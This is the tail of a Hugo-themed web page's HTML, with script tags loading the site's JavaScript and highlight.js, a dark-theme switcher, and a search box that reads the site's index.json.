<script src=/js/semantic.min.js></script>
<script src=/js/jquery.overlayScrollbars.min.js></script>
<script src=/js/header.js></script>
<script src=/js/main.js></script>
<script src=/js/theme.js></script>
<script src=/js/html2canvas.min.js></script>
<script src=/js/post.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script>
<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script>
<div class="ui inverted segment" id=dream-search>
<div class="ui search">
<div class="ui transparent input">
<input class=prompt type=text placeholder=Search>
</div>
<div class=results></div>
</div>
</div>
<script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script>
<script src=/js/search.js></script>
</body>
</html>